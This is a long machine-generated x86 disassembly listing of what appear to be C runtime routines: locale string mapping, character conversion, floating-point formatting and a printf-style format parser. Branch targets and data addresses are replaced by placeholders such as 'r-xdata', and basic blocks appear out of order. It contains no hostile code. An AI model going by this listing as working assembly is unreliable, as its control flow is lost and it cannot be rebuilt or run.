mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x54 ]
call sub_42a513
retn
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_42eaa6
add esp 0x18
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and eax 0xfffffffc
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x2c ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax esi
push [ ebp - 0x34 ]
call sub_429931
pop ecx
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
mov [ ebp - 0x40 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x2c ] ebx
jne r-xdata
mov esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] ebx
add eax 0x3
and eax 0xfffffffc
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x44 ] edi
push esi
push ebx
push edi
call sub_42b940
add esp 0xc
jmp r-xdata
push esi
push [ ebp - 0x2c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ esi + esi ]
push eax
call sub_429a56
pop ecx
mov [ ebp - 0x2c ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0x34 ] ebx
je r-xdata
push edi
call sub_429931
pop ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push ebx
push ebx
push esi
push [ ebp - 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x20 ] 0x1
push [ ebp - 0x40 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0x34 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov [ ebp - 0x40 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x40 ]
call sub_429a56
pop ecx
mov edi eax
cmp edi ebx
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x30 ]
call sub_429931
pop ecx
test [ ebp + 0xd ] 0x4
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x3c ]
call sub_42eaa6
add esp 0x18
mov esi eax
neg esi
sbb esi esi
neg esi
jmp r-xdata
xor esi esi
jmp r-xdata
push [ ebp - 0x40 ]
push ebx
push edi
call sub_42b940
add esp 0xc
mov [ ebp - 0x38 ] 0x1
mov eax edi
jmp r-xdata
push [ ebp - 0x2c ]
call sub_429931
pop ecx
mov [ ebp - 0x4 ] 0x2
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x30 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
cmp [ ebp - 0x30 ] ebx
jne r-xdata
cmp edi [ ebp + 0x1c ]
jg r-xdata
push edi
push [ ebp - 0x30 ]
push esi
push [ ebp - 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ edi + edi ]
push eax
call sub_429a56
pop ecx
mov [ ebp - 0x30 ] eax
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp - 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
jmp r-xdata
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov [ ebp - 0x24 ] 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
push edi
push [ ebp - 0x30 ]
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
sub_42c0a8
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
sar ecx 0x8
push esi
mov esi [ rw-data ]
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
xor eax eax
inc eax
and [ ebp - 0x2 ] 0x0
push 0x2
mov [ ebp - 0x3 ] al
mov [ ebp - 0x4 ] cl
pop eax
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
push 0x1
push [ rw-data ]
lea ecx [ ebp + 0xa ]
push [ rw-data ]
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_42ed46
add esp 0x1c
test eax eax
jne r-xdata
sub_42c126
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_429b24
cmp eax 0x65
pop ecx
je r-xdata
mov al [ esi ]
mov cl [ rw-data ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
movsx eax [ esi ]
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
push 0x4
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_42c17e
mov eax [ esp + 0x4 ]
push ebx
mov bl [ rw-data ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
inc eax
pop ebx
retn
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] bl
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_42c1e3
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_42f267
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_42f224
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_42c221
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_42daa0
inc eax
push eax
push esi
add esi edi
push esi
call sub_429090
add esp 0x10
sub_42c23e
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_42f4d9
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov esi eax
push esi
lea eax [ ebx + 0x1 ]
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
xor ecx ecx
test ebx ebx
setg cl
add edx eax
add ecx edx
push ecx
call sub_42f3a8
add esp 0x14
mov ebx [ ebp + 0x10 ]
mov eax [ rw-data ]
xor ecx ecx
test ebx ebx
setg cl
xor edx edx
cmp [ eax ] 0x2d
mov esi eax
sete dl
mov edi ecx
add edx [ ebp + 0xc ]
mov eax edx
call sub_42c221
jmp r-xdata
test ebx ebx
jle r-xdata
mov [ eax ] 0x2d
inc eax
cmp [ esi ] 0x2d
mov eax [ ebp + 0xc ]
jne r-xdata
xor ecx ecx
cmp [ rw-data ] cl
push r--data
sete cl
add ecx eax
add ecx ebx
push ecx
call sub_42f2b0
cmp [ ebp + 0x14 ] 0x0
pop ecx
pop ecx
mov ecx eax
je r-xdata
lea edi [ eax + 0x1 ]
mov cl [ edi ]
mov [ eax ] cl
mov cl [ rw-data ]
mov eax edi
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x4 ]
dec eax
jns r-xdata
inc ecx
cmp eax 0x64
jl r-xdata
neg eax
mov [ ecx ] 0x2d
inc ecx
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop esi
idiv esi
add [ ecx ] al
mov eax edx
add [ ecx + 0x1 ] al
cdq
push 0xa
pop esi
idiv esi
add [ ecx ] al
mov eax edx
sub_42c331
cmp [ rw-data ] 0x0
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_42f4d9
mov esi eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x24 ]
push esi
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax ebx
push eax
call sub_42f3a8
add esp 0x14
mov eax [ rw-data ]
cmp eax [ esp + 0x1c ]
mov esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea ebp [ ebx + 0x1 ]
cmp [ esi ] 0x2d
mov ebp ebx
jne r-xdata
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebx
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
jmp r-xdata
add ebp eax
mov eax ebp
call sub_42c221
mov [ ebp ] 0x30
inc ebp
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn
mov eax ebp
call sub_42c221
mov al [ rw-data ]
mov [ ebp ] al
mov esi [ esi + 0x4 ]
inc ebp
test esi esi
jge r-xdata
cmp [ esp + 0x1c ] 0x0
jle r-xdata
neg esi
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esp + 0x1c ] esi
cmp [ esp + 0x1c ] esi
jl r-xdata
mov edi [ esp + 0x1c ]
mov eax ebp
call sub_42c221
push edi
push 0x30
push ebp
call sub_42b940
add esp 0xc
sub_42c40e
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ esi + 0x4 ]
push [ esi ]
call sub_42f4d9
mov ecx [ eax + 0x4 ]
mov ebx [ ebp + 0x10 ]
dec ecx
mov [ rw-data ] ecx
xor ecx ecx
cmp [ eax ] 0x2d
push eax
sete cl
push ebx
mov [ rw-data ] eax
add ecx [ ebp + 0xc ]
mov edi ecx
push edi
call sub_42f3a8
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
add esp 0x14
dec eax
cmp [ rw-data ] eax
mov [ rw-data ] eax
setl cl
cmp eax 0xfffffffc
mov [ rw-data ] cl
jl r-xdata
push [ ebp + 0x14 ]
mov [ rw-data ] 0x1
push ebx
push [ ebp + 0xc ]
push esi
call sub_42c23e
add esp 0x10
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
push ebx
push [ ebp + 0xc ]
mov [ rw-data ] 0x1
push esi
call sub_42c331
add esp 0xc
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
and [ rw-data ] 0x0
pop edi
pop esi
pop ebx
pop ebp
retn
and [ edi - 0x2 ] al
sub_42c4b8
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c23e
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c40e
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c331
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_42c51b
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_42c55b
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_42c51b
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_42c584
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
test al 0x82
mov ebx [ esi + 0x10 ]
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and eax 0xffffffef
or eax 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push ebx
call sub_42f750
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_42f948
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_42f750
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_42f904
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov ecx ebx
and ecx 0x1f
lea eax [ eax + ecx * 8 ]
jmp r-xdata
add esp 0xc
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_42f6c4
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_42c69a
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_42c584
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_42c6cd
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_42c69a
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_42c6f1
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ esp + 0xc ]
mov ecx edi
call sub_42c69a
inc ebx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebx
retn
mov eax [ esp + 0xc ]
add [ esi ] eax
jmp r-xdata
sub_42c728
push ebp
mov ebp esp
sub esp 0x254
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov bl [ eax ]
xor ecx ecx
test bl bl
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
mov eax [ ebp - 0x18 ]
pop ebx
call sub_42fac0
leave
retn
push esi
push edi
mov edi eax
jmp r-xdata
inc edi
cmp [ ebp - 0x18 ] 0x0
mov [ ebp + 0xc ] edi
jl r-xdata
pop edi
pop esi
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
test bl bl
jne r-xdata
jmp [ eax * 4 + jump_table_42ce9d ]
movsx eax bl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x38 ]
xor eax eax
or [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x28 ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0xc ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x28 ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
cmp eax ecx
mov [ ebp - 0x38 ] eax
ja r-xdata
or [ ebp - 0x8 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x24 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x4
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test eax eax
mov [ ebp - 0x24 ] eax
jge r-xdata
mov eax [ ebp - 0xc ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x4
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test eax eax
mov [ ebp - 0xc ] eax
jge r-xdata
mov al [ edi ]
cmp al 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
mov ecx [ ebp + 0x8 ]
lea esi [ ebp - 0x18 ]
mov al bl
call sub_42c69a
jmp r-xdata
mov ecx [ ebp + 0x8 ]
lea esi [ ebp - 0x18 ]
mov al bl
call sub_42c69a
mov bl [ edi ]
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x8 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x8 ] 0x4
neg [ ebp - 0x24 ]
jmp r-xdata
or [ ebp - 0xc ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x8 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x8 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x8 ] 0x40
cmp [ ebp - 0xc ] 0x0
lea esi [ ebp - 0x254 ]
mov [ ebp - 0x10 ] esi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x8 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
inc edi
inc edi
or [ ebp - 0x7 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x8 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
add [ ebp + 0x10 ] 0x4
test bl 0x20
mov eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add ecx 0x8
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x4
test [ ebp - 0x8 ] 0x20
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x8 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc edi
inc edi
and [ ebp - 0x7 ] 0x7f
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x7 ] 0x8
jmp r-xdata
test bl 0x40
mov eax [ eax - 0x4 ]
jne r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] ecx
mov cx [ ebp - 0x18 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x8 ] 0x80
mov [ ebp - 0x14 ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax 0x200
cmp [ ebp - 0xc ] eax
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push [ ebp - 0x3c ]
add eax 0x8
push [ ebp - 0xc ]
mov [ ebp + 0x10 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push esi
push eax
mov [ ebp - 0x4c ] ecx
call [ rw-data ]
mov edi [ ebp - 0x8 ]
add esp 0x14
and edi 0x80
je r-xdata
add [ ebp + 0x10 ] 0x4
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test eax eax
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x30 ] ecx
sub eax 0x43
je r-xdata
or [ ebp - 0x8 ] 0x8
jmp r-xdata
cmp al 0x6f
je r-xdata
cdq
jmp r-xdata
xor edx edx
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
test [ ebp - 0x8 ] esi
mov ebx eax
mov edi edx
jne r-xdata
test edx edx
jg r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov esi 0x8000
test esi ebx
je r-xdata
or [ ebp - 0x7 ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0x8
sub eax 0x3
je r-xdata
mov edi 0xa3
cmp [ ebp - 0xc ] edi
jle r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
add [ ebp + 0x10 ] 0x4
test [ ebp - 0x8 ] 0x810
mov eax [ ebp + 0x10 ]
je r-xdata
dec eax
jne r-xdata
mov al [ ebp - 0x30 ]
add al 0x51
mov [ ebp - 0x1c ] 0x30
mov [ ebp - 0x1b ] al
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
test [ ebp - 0x8 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
push [ ebp - 0x2c ]
call sub_429931
and [ ebp - 0x2c ] 0x0
pop ecx
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
add eax 0x15d
push eax
call sub_429a56
test eax eax
pop ecx
mov [ ebp - 0x2c ] eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
push esi
call [ rw-data ]
pop ecx
call sub_42daa0
pop ecx
jmp r-xdata
test [ ebp - 0x7 ] 0x8
movsx eax [ eax ]
mov [ ebp - 0x10 ] ecx
je r-xdata
mov al [ eax - 0x4 ]
mov [ ebp - 0x254 ] al
mov [ ebp - 0x14 ] 0x1
movsx eax [ eax - 0x4 ]
push eax
lea eax [ ebp - 0x254 ]
push eax
call sub_42fa29
test eax eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
jge r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
or [ ebp - 0x7 ] 0x8
mov [ ebp - 0x3c ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
and [ ebp - 0x8 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0xc ] eax
jle r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x7 ] 0x1
test eax eax
jae r-xdata
add [ ebp + 0x10 ] 0x4
test [ ebp - 0x8 ] 0x810
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x10 ] eax
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
mov esi eax
jmp r-xdata
push esi
or [ ebp - 0x7 ] 0x1
inc esi
mov [ ebp - 0x10 ] esi
push esi
call [ rw-data ]
pop ecx
mov [ ebp - 0x14 ] eax
and [ ebp - 0x28 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
lea eax [ ebp - 0x254 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test bl 0x40
je r-xdata
sub eax 0xc
jne r-xdata
cmp al 0x58
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov [ ebp - 0x30 ] 0x27
jmp r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x20 ]
sub esi [ ebp - 0x14 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
test [ ebp - 0x8 ] 0x830
jne r-xdata
and [ ebp - 0x38 ] 0x0
lea esi [ ebp - 0x55 ]
and [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
test [ ebp - 0x8 ] 0x80
mov [ ebp - 0x14 ] 0x10
je r-xdata
push [ ebp - 0x20 ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x1c ]
call sub_42c6f1
test bl 0x8
pop ecx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push esi
push 0x20
call sub_42c6cd
add esp 0xc
test bl 0x1
je r-xdata
mov [ ebp - 0x1c ] 0x2d
jmp r-xdata
or [ ebp - 0x7 ] 0x8
mov eax [ ebp - 0x14 ]
cdq
push edx
push eax
push edi
push ebx
call sub_42fad0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x40 ] ebx
mov ebx eax
mov edi edx
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x1c ] 0x2b
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x30 ]
